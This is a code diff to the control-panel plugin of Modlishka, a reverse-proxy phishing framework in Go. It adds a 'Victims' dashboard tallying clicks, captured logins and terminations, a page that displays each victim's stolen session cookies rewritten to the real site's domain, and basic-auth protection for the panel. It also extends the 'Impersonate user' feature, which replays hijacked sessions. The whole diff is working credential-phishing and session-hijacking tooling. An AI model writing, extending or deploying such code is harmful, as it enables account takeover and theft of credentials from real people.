@@ -21,6 +21,7 @@ import (
 	"flag"
 	"fmt"
 	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/runtime"
 	"github.com/drk1wi/Modlishka/log"
 	"github.com/tidwall/buntdb"
 	"html/template"
@@ -37,6 +38,8 @@ import (
 type ExtendedControlConfiguration struct {
 	*config.Options
 	CredParams *string `json:"CredParams"`
+	ControlURL *string `json:"ControlURL"`
+	ControlCreds *string `json:"ControlCreds"`
 }
 
 type ControlConfig struct {
@@ -44,14 +47,15 @@ type ControlConfig struct {
 	usernameRegexp *regexp.Regexp
 	passwordRegexp *regexp.Regexp
 	active         bool
+	url            string
+	controlUser    string
+	controlPass    string
 }
 
 type RequetCredentials struct {
 	usernameFieldValue string
 	passwordFieldValue string
 }
-
-const URL = `SayHello2Modlishka`
 
 var htmltemplate = `<!DOCTYPE html>
 <html lang="en">
@@ -86,24 +90,48 @@ function clearcookies(){
 <body>
 
 <div class="container">
-  <h2>Collected user credentials</h2>
+  <h1>Victims</h1>
+  <div class="row">
+  	<div class="col-md-4 text-center">
+  		<h2>Clicks</h2>
+  		<p style="font-size: 2em;">{{len .Victims}}</p>
+  	</div>
+  	<div class="col-md-4 text-center">
+  		<h2>Logins</h2>
+  		<p style="font-size: 2em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
+  	</div>
+  	<div class="col-md-4 text-center">
+  		<h2>Terminations</h2>
+  		<p style="font-size: 2em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
+  	</div>
+  </div>
   <table class="table table-dark">
     <thead class="thead-dark">
       <tr>
-        <th>UUID</th>
-        <th>Username</th>
-        <th>Password</th>
-        <th>Session</th>
+        <th class="text-center">UUID</th>
+        <th class="text-center">Username</th>
+        <th class="text-center">Password</th>
+        <th class="text-center">Terminated</th>
+        <th class="text-center">Session</th>
+        <th class="text-center">Cookies</th>
 
       </tr>
     </thead>
     <tbody>
-    {{range .}}
+    {{range .Victims}}
       <tr>
         <td>{{.UUID}}</td>
         <td>{{.Username}}</td>
         <td>{{.Password}}</td>
-        <td><a onclick="clearcookies();" href="/` + URL + `/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a>
+        <td class="text-center">
+        {{if .Terminated}}
+        <span style="color: green; font-weight: bold;">Y</span>
+        {{else}}
+        <span style="color: red; font-weight: bold;">N</span>
+        {{end}}
+        </td>
+        <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a>
+        <td><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
 		</td>
 
       </tr>
@@ -184,19 +212,51 @@ setTimeout(function() {document.location='/'; }, 5000);
 </html>
 `
 
+var cookietemplate = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Modlishka Control Panel v.0.1 (beta)</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+</head>
+<body>
+
+<div class="container">
+  <h2>Cookies</h2>
+  {{ . }}
+</div>
+
+</body>
+</html>
+`
+
 type Victim struct {
 	UUID     string
 	Username string
 	Password string
 	Session  string
+	Terminated bool
 }
+
 type Cookie struct {
-	Name     string    `json:"name"`
-	Value    string    `json:"value"`
-	Domain   string    `json:"domain"`
-	Secure   bool      `json:"secure"`
-	HTTPOnly bool      `json:"httponly"`
-	Expires  time.Time `json:"expires"`
+	Name  string `json:"name"`
+	Value string `json:"value"`
+
+	Path       string `json:"path"`
+	Domain     string `json:"domain"`
+	Expires    time.Time `json:"expire"`
+	RawExpires string 
+
+	// MaxAge=0 means no 'Max-Age' attribute specified.
+	// MaxAge<0 means delete cookie now, equivalently 'Max-Age: 0'
+	// MaxAge>0 means Max-Age attribute present and given in seconds
+	MaxAge   int 
+	Secure   bool `json:"secure"`
+	HttpOnly bool `json:"httpOnly"`
+	SameSite http.SameSite
 }
 
 type CookieJar struct {
@@ -204,6 +264,8 @@ type CookieJar struct {
 }
 
 var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
+var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.")
+var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
 
 var CConfig ControlConfig
 
@@ -290,11 +352,15 @@ func (victim *Victim) setCookies(cookies []*http.Cookie, url *url.URL) error {
 	for _, v := range cookies {
 		c := Cookie{
 			Name:     v.Name,
-			Domain:   v.Domain,
 			Value:    v.Value,
+			Path:   v.Path,
+			Domain:   v.Domain,
 			Expires:  v.Expires,
-			HTTPOnly: v.HttpOnly,
+			RawExpires:  v.RawExpires,
+			MaxAge:  v.MaxAge,
+			HttpOnly: v.HttpOnly,
 			Secure:   v.Secure,
+			SameSite:   v.SameSite,
 		}
 
 		jar.setCookie(&c)
@@ -424,6 +490,10 @@ func (config *ControlConfig) updateEntry(victim *Victim) error {
 		entry.Session = victim.Session
 	}
 
+	if victim.Terminated {
+		entry.Terminated = true
+	}
+
 	err = config.addEntry(entry)
 	if err != nil {
 		return err
@@ -520,9 +590,39 @@ func HelloHandler(w http.ResponseWriter, r *http.Request) {
 	w.WriteHeader(http.StatusOK)
 	w.Header().Set("Content-Type", "application/json")
 	victims, _ := CConfig.listEntries()
+	credsCount := 0
+	for _, v := range victims {
+		if v.Password != "" {
+			credsCount += 1
+		}
+	}
+	termCount := 0
+	for _, v := range victims {
+		if v.Terminated {
+			termCount += 1
+		}
+	}
+	data := struct {
+        Victims   []Victim
+        CredsCount int
+        TermCount int
+        CredsPercent float64
+        TermPercent float64
+        URL string
+    }{
+        victims,
+        credsCount,
+        termCount,
+        float64(credsCount) / float64(len(victims)) * 100,
+        float64(termCount) / float64(len(victims)) * 100,
+        CConfig.url,
+    }
 	t := template.New("modlishka")
 	t, _ = t.Parse(htmltemplate)
-	_ = t.Execute(w, victims)
+	err := t.Execute(w, data)
+	if err != nil {
+		log.Errorf("Error %s", err)
+	}
 
 	//v,_ :=json.Marshal(&victims)
 	//io.WriteString(w,string(v))
@@ -563,7 +663,7 @@ func HelloHandlerImpersonate(w http.ResponseWriter, r *http.Request) {
 				cookie = cookie + ";Secure"
 			}
 
-			if v.HTTPOnly {
+			if v.HttpOnly {
 				cookie = cookie + ";HttpOnly"
 			}
 
@@ -617,7 +717,7 @@ func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {
 
 	var iframes []string
 	for k, _ := range domains {
-		iframes = append(iframes, "https://"+k+"/"+URL+"/Impersonate?user_id="+users[0])
+		iframes = append(iframes, "https://"+k+"/"+CConfig.url+"/Impersonate?user_id="+users[0])
 	}
 
 	w.WriteHeader(http.StatusOK)
@@ -628,6 +728,95 @@ func HelloHandlerImpersonateFrames(w http.ResponseWriter, r *http.Request) {
 	t, _ = t.Parse(iframetemplate)
 	_ = t.Execute(w, iframes)
 
+}
+
+func HelloHandlerCookieDisplay(w http.ResponseWriter, r *http.Request) {
+
+	users, ok := r.URL.Query()["user_id"]
+
+	if !ok || len(users[0]) < 1 {
+		log.Infof("Url Param 'users_id' is missing")
+		return
+	}
+
+	victim := Victim{UUID: users[0], Username: "", Password: "", Session: ""}
+	entry, err := CConfig.getEntry(&victim)
+	if err != nil {
+		log.Infof("Error %s", err.Error())
+		return
+	}
+	var jar = CookieJar{}
+	err = json.Unmarshal([]byte(entry.Session), &jar)
+	if err != nil {
+		log.Infof("Error %s", err.Error())
+		return
+	}
+
+	var cookies []Cookie
+	for _, v := range jar.Cookies {
+		newCookie := v
+		newCookie.Domain = runtime.PhishURLToRealURL(v.Domain)
+		cookies = append(cookies, *v)
+	}
+
+	cookiesByte, err := json.Marshal(cookies)
+	cookiesOut := string(cookiesByte)
+
+	w.WriteHeader(http.StatusOK)
+
+	w.Header().Set("Content-Type", "application/html")
+
+	t := template.New("modlishkacookiejson")
+	t, _ = t.Parse(cookietemplate)
+	_ = t.Execute(w, cookiesOut)
+
+}
+
+// Copied from https://gist.github.com/elithrar/9146306
+func use(h http.HandlerFunc, middleware ...func(http.HandlerFunc) http.HandlerFunc) http.HandlerFunc {
+	for _, m := range middleware {
+		h = m(h)
+	}
+
+	return h
+}
+
+// Based on https://gist.github.com/elithrar/9146306
+func basicAuth(h http.HandlerFunc) http.HandlerFunc {
+	return func(w http.ResponseWriter, r *http.Request) {
+
+		if CConfig.controlUser == "" {
+			h.ServeHTTP(w, r)
+			return
+		}
+
+		w.Header().Set("WWW-Authenticate", `Basic realm="Restricted"`)
+
+		s := strings.SplitN(r.Header.Get("Authorization"), " ", 2)
+		if len(s) != 2 {
+			http.Error(w, "Not authorized", 401)
+			return
+		}
+
+		b, err := base64.StdEncoding.DecodeString(s[1])
+		if err != nil {
+			http.Error(w, err.Error(), 401)
+			return
+		}
+
+		pair := strings.SplitN(string(b), ":", 2)
+		if len(pair) != 2 {
+			http.Error(w, "Not authorized", 401)
+			return
+		}
+
+		if pair[0] != CConfig.controlUser || pair[1] != CConfig.controlPass {
+			http.Error(w, "Not authorized", 401)
+			return
+		}
+
+		h.ServeHTTP(w, r)
+	}
 }
 
 func init() {
@@ -663,7 +852,10 @@ func init() {
 
 		CConfig.active = false
 
+		// Regexes to grab username and passwords sent in POST
 		var creds []string
+		// Credentials to log into the control page
+		var controlCreds []string
 
 		var jsonConfig ExtendedControlConfiguration
 
@@ -686,6 +878,25 @@ func init() {
 				return
 			}
 
+		}
+
+		if jsonConfig.ControlURL != nil {
+			CConfig.url = *jsonConfig.ControlURL
+		} else if *controlURL != "" {
+			CConfig.url = *controlURL
+		}
+
+		if jsonConfig.ControlCreds != nil {
+			controlCreds = strings.Split(*jsonConfig.ControlCreds, ":")
+		} else if *controlCredentials != "" {
+			controlCreds = strings.Split(*controlCredentials, ":")
+		}
+
+		if len(controlCreds) == 2 {
+			CConfig.controlUser = controlCreds[0]
+			CConfig.controlPass = controlCreds[1]
+		} else if len(controlCreds) == 1 || len(controlCreds) > 2 {
+			log.Fatalf("Control credentials must be provided in user:pass format")
 		}
 
 		if jsonConfig.CredParams != nil {
@@ -720,12 +931,13 @@ func init() {
 	// Register your http handlers
 	s.RegisterHandler = func(handler *http.ServeMux) {
 
-		handler.HandleFunc("/"+URL+"/", HelloHandler)
-		handler.HandleFunc("/"+URL+"/ImpersonateFrames", HelloHandlerImpersonateFrames)
-		handler.HandleFunc("/"+URL+"/Impersonate", HelloHandlerImpersonate)
+		handler.HandleFunc("/"+CConfig.url+"/", use(HelloHandler, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/ImpersonateFrames", use(HelloHandlerImpersonateFrames, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/Impersonate", use(HelloHandlerImpersonate, basicAuth))
+		handler.HandleFunc("/"+CConfig.url+"/Cookies", use(HelloHandlerCookieDisplay, basicAuth))
 
-		log.Infof("Control Panel: " + URL + " handler registered	")
-		log.Infof("Control Panel URL: /" + URL)
+		log.Infof("Control Panel: " + CConfig.url + " handler registered	")
+		log.Infof("Control Panel URL: " + *config.C.ProxyDomain + "/" + CConfig.url)
 
 	}
 
@@ -733,6 +945,19 @@ func init() {
 	s.HTTPRequest = func(req *http.Request, context *HTTPContext) {
 
 		if CConfig.active {
+
+			if context.UserID != "" {
+				// Save every new ID that comes to the site
+				victim := Victim{UUID: context.UserID}
+				_, err := CConfig.getEntry(&victim)
+				// Entry doesn't exist yet
+				if err != nil {
+					if err := CConfig.updateEntry(&victim); err != nil {
+						log.Infof("Error %s", err.Error())
+						return
+					}
+				}
+			}
 
 			if creds, found := CConfig.checkRequestCredentials(req); found {
 
@@ -810,6 +1035,17 @@ func init() {
 				return
 			}
 
+		}
+
+	}
+
+	s.TerminateUser = func(userID string){
+		log.Infof("Invoking control terminate")
+		victim := Victim{UUID: userID, Terminated: true}
+		err := CConfig.updateEntry(&victim)
+		if err != nil {
+			log.Errorf("Error %s", err)
+			return
 		}
 
 	}
